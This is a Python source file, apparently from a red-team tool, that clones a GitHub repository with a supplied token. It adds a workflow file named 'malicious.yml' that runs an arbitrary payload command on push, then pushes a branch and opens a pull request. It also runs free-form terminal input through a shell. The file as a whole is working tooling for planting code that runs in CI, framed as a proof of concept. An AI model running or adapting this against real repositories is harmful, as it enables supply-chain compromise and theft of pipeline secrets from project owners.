import os
import subprocess
import uuid
from github import Github

def simulate_malicious_pr(repo_url: str, github_token: str, payload_cmd: str, interactive: bool = False, terminal_input: str = "") -> str:
    repo_name = repo_url.rstrip("/").split("/")[-1]
    repo_owner = repo_url.rstrip("/").split("/")[-2]
    clone_dir = os.path.join("temp_repos", f"malicious_{uuid.uuid4().hex[:6]}")

    os.makedirs(clone_dir, exist_ok=True)
    authenticated_url = repo_url.replace("https://", f"https://{github_token}@")
    subprocess.run(["git", "clone", authenticated_url, clone_dir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Set git user identity for commits
    subprocess.run(["git", "config", "user.name", "RedOpsBot"], cwd=clone_dir)
    subprocess.run(["git", "config", "user.email", "redops@local.io"], cwd=clone_dir)

    branch_name = f"malicious-patch-{uuid.uuid4().hex[:4]}"
    subprocess.run(["git", "checkout", "-b", branch_name], cwd=clone_dir)

    wf_path = os.path.join(clone_dir, ".github", "workflows")
    os.makedirs(wf_path, exist_ok=True)
    wf_file = os.path.join(wf_path, "malicious.yml")

    with open(wf_file, "w") as f:
        f.write(f"""
name: Malicious Payload
on: [push]
jobs:
  evil:
    runs-on: ubuntu-latest
    steps:
      - name: Execute Payload
        run: {payload_cmd}
""")

    subprocess.run(["git", "add", "."], cwd=clone_dir)
    subprocess.run(["git", "commit", "-m", "Add malicious workflow"], cwd=clone_dir)

    # Se for terminal interativo, simular push
    if interactive and terminal_input:
        cmds = terminal_input.strip().split("\n")
        outputs = []
        for cmd in cmds:
            try:
                result = subprocess.run(cmd, shell=True, cwd=clone_dir, capture_output=True, text=True)
                outputs.append(f"$ {cmd}\n{result.stdout}{result.stderr}")
            except Exception as e:
                outputs.append(f"❌ Error running `{cmd}`: {str(e)}")
        return "\n".join(outputs)

    # Push normal com token
    subprocess.run(["git", "push", "origin", branch_name], cwd=clone_dir)

    # Criar PR via API
    g = Github(github_token)
    repo = g.get_repo(f"{repo_owner}/{repo_name}")
    pr = repo.create_pull(
        title="[POC] Test Malicious Workflow",
        body="This is a security testing PR.",
        head=branch_name,
        base="main"
    )

    return f"✅ PR created: {pr.html_url}"
